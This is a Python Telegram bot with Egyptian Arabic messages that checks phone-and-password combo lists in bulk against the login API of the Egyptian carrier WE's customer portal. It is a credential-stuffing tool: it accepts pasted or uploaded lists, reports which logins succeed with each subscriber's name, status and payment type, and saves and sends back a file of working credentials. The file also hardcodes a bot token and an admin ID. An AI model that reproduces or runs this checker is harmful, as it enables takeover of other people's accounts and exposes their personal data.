#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import time
import json
import os
import telebot
from datetime import datetime
from threading import Thread

# ==================== إعدادات البوت ====================
BOT_TOKEN = "6869285568:AAF8KlhQ1tr8js1rPopOvhNPJPclIcQaCic"
ADMIN_ID = 6264668799  # الآيدي بتاعك

bot = telebot.TeleBot(BOT_TOKEN)

# ==================== دوال مساعدة ====================
def format_phone(phone):
    phone = re.sub(r'\D', '', phone)
    if not phone:
        return None
    if len(phone) == 11 and phone.startswith("0"):
        return phone
    elif len(phone) == 10:
        return "0" + phone
    return None

def is_valid_prefix(phone):
    phone = re.sub(r'\D', '', phone)
    return phone.startswith(("010", "011", "012", "015"))

def extract_accounts_from_text(text):
    """استخراج الحسابات من نص - يدعم 010 / 011 / 012 / 015"""
    accounts = []
    seen = set()
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        match = re.search(r'(01[0125]\d{8})', line)
        if match:
            phone = match.group(1)
            if phone in seen:
                continue
            remaining = line[line.find(phone) + len(phone):].strip()
            password = ""
            if remaining.startswith(":"):
                password = remaining[1:].strip()
            elif ":" in remaining:
                password = remaining.split(":", 1)[1].strip()
            else:
                parts = line.split()
                for i, part in enumerate(parts):
                    if phone in part and i + 1 < len(parts):
                        password = parts[i + 1]
                        break
            if password:
                accounts.append((phone, password))
                seen.add(phone)
    return accounts

# ==================== تسجيل الدخول ====================
def login_we(phone, password):
    session = requests.Session()
    try:
        session.get("https://my.te.eg/echannel/", timeout=10)
    except:
        pass

    login_id = phone[1:] if phone.startswith("0") else phone

    try:
        r = session.post(
            "https://captcha.te.eg/api/Captcha/GenerateCaptcha",
            json={"identifier": phone, "merchantName": "E-Care", "serviceName": "Login"},
            timeout=10
        )
        captcha = r.json().get("token", "")

        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "channelId": "702",
            "deviceId": f"ANDROID_{int(time.time())}",
            "isMobile": "true",
            "isSelfcare": "true",
            "languageCode": "ar-EG",
        }

        data = {
            "acctId": login_id,
            "password": password,
            "appLocale": "ar-EG",
            "isSelfcare": "Y",
            "isMobile": "Y",
            "imgCacheKey": captcha
        }

        r = session.post(
            "https://my.te.eg/echannel/service/besapp/base/rest/busiservice/v1/auth/userAuthenticate",
            headers=headers,
            json=data,
            timeout=15
        )

        result = r.json()
        ret_code = result.get("header", {}).get("retCode")

        if ret_code != "0":
            return None, ret_code

        body = result.get("body", {})
        subscriber = body.get("subscriber", {})
        customer = body.get("customer", {})

        info = {
            "name": customer.get("custName", "غير معروف"),
            "phone": subscriber.get("servNumber", phone),
            "status": "نشط" if subscriber.get("status") == "2" else "غير نشط",
            "payment_type": "كارت" if subscriber.get("paymentType") == "0" else "فاتورة",
            "account_type": subscriber.get("accountType", "غير معروف")
        }
        return info, "0"

    except Exception as e:
        return None, str(e)

# ==================== فحص حساب ====================
def check_account(phone, password):
    phone = format_phone(phone)
    if not phone:
        return {"success": False, "error": "رقم غير صالح", "phone": phone, "password": password}

    info, login_result = login_we(phone, password)

    if not info:
        return {
            "success": False,
            "error": f"فشل الدخول (كود: {login_result})",
            "phone": phone,
            "password": password
        }

    return {
        "success": True,
        "phone": phone,
        "password": password,
        "name": info.get("name", "غير معروف"),
        "serv_number": info.get("phone", phone),
        "status": info.get("status", "غير معروف"),
        "payment_type": info.get("payment_type", "غير معروف"),
        "account_type": info.get("account_type", "غير معروف")
    }

# ==================== تنسيق رسالة النتيجة ====================
def format_result_msg(result):
    if result["success"]:
        msg = "✅ <b>تم الدخول بنجاح</b>\n\n"
        msg += f"📱 <code>{result['phone']}:{result['password']}</code>\n"
        msg += f"👤 الاسم: {result['name']}\n"
        msg += f"📞 الرقم المسجل: {result['serv_number']}\n"
        msg += f"📊 الحالة: {result['status']}\n"
        msg += f"💳 نظام الدفع: {result['payment_type']}\n"
        msg += f"📦 نوع الحساب: {result['account_type']}\n"
    else:
        msg = "❌ <b>فشل الدخول</b>\n\n"
        msg += f"📱 <code>{result['phone']}:{result['password']}</code>\n"
        msg += f"⚠️ السبب: {result['error']}\n"
    return msg

# ==================== حفظ النتائج ====================
def save_working(result):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("accounts_working.txt", "a", encoding="utf-8") as f:
        f.write(f"{timestamp} | {result['phone']}:{result['password']} | {result['name']} | {result['status']}\n")

# ==================== /start ====================
@bot.message_handler(commands=['start'])
def cmd_start(message):
    text = (
        "👋 <b>أهلاً بيك في بوت فحص WE</b>\n\n"
        "📌 <b>الطرق المتاحة:</b>\n\n"
        "1️⃣ ابعتلي <b>رقم + باسوورد</b> في رسالة واحدة\n"
        "   مثال:\n"
        "   <code>01550564876:Zn@1234567890</code>\n"
        "   أو\n"
        "   <code>01550564876 Zn@1234567890</code>\n\n"
        "2️⃣ ابعتلي <b>ملف .txt</b> فيه الحسابات\n"
        "   (كل سطر: رقم باسوورد)\n\n"
        "⚠️ <b>الأرقام المدعومة:</b> 010 / 011 / 012 / 015\n"
    )
    bot.reply_to(message, text, parse_mode="HTML")

# ==================== استقبال ملف ====================
@bot.message_handler(content_types=['document'])
def handle_file(message):
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        text = downloaded.decode("utf-8", errors="ignore")

        accounts = extract_accounts_from_text(text)

        if not accounts:
            bot.reply_to(message, "❌ مفيش أرقام 010/011/012/015 صالحة في الملف ده.")
            return

        bot.reply_to(
            message,
            f"📁 <b>تم استلام الملف</b>\n\n"
            f"📊 عدد الحسابات: <b>{len(accounts)}</b>\n"
            f"🚀 جاري الفحص...",
            parse_mode="HTML"
        )

        Thread(target=process_accounts, args=(message.chat.id, accounts)).start()

    except Exception as e:
        bot.reply_to(message, f"❌ خطأ في الملف: {e}")

# ==================== استقبال نص (رقم + باسوورد) ====================
@bot.message_handler(func=lambda m: True, content_types=['text'])
def handle_text(message):
    text = message.text.strip()

    if text.startswith("/"):
        return

    accounts = extract_accounts_from_text(text)

    if not accounts:
        bot.reply_to(
            message,
            "⚠️ مش لاقي رقم صالح.\n\n"
            "ابعت بالشكل ده:\n"
            "<code>01550564876:Zn@1234567890</code>\n"
            "أو\n"
            "<code>01550564876 Zn@1234567890</code>",
            parse_mode="HTML"
        )
        return

    bot.reply_to(
        message,
        f"🔍 جاري فحص <b>{len(accounts)}</b> حساب...",
        parse_mode="HTML"
    )

    Thread(target=process_accounts, args=(message.chat.id, accounts)).start()

# ==================== معالجة الفحص ====================
def process_accounts(chat_id, accounts):
    total = len(accounts)
    working = []

    for i, (phone, password) in enumerate(accounts, 1):
        result = check_account(phone, password)

        msg = f"<b>[{i}/{total}]</b>\n" + format_result_msg(result)

        try:
            bot.send_message(chat_id, msg, parse_mode="HTML")
        except:
            pass

        if result["success"]:
            working.append(result)
            save_working(result)

        if i < total:
            time.sleep(1)

    summary = (
        f"📊 <b>الملخص النهائي</b>\n\n"
        f"📱 تم فحص: <b>{total}</b>\n"
        f"✅ ناجح: <b>{len(working)}</b>\n"
        f"❌ فاشل: <b>{total - len(working)}</b>\n"
    )
    bot.send_message(chat_id, summary, parse_mode="HTML")

    if working and os.path.exists("accounts_working.txt"):
        try:
            with open("accounts_working.txt", "rb") as f:
                bot.send_document(chat_id, f)
        except:
            pass

# ==================== تشغيل ====================
if __name__ == "__main__":
    print("🤖 البوت شغال...")
    bot.infinity_polling(timeout=30, long_polling_timeout=30)
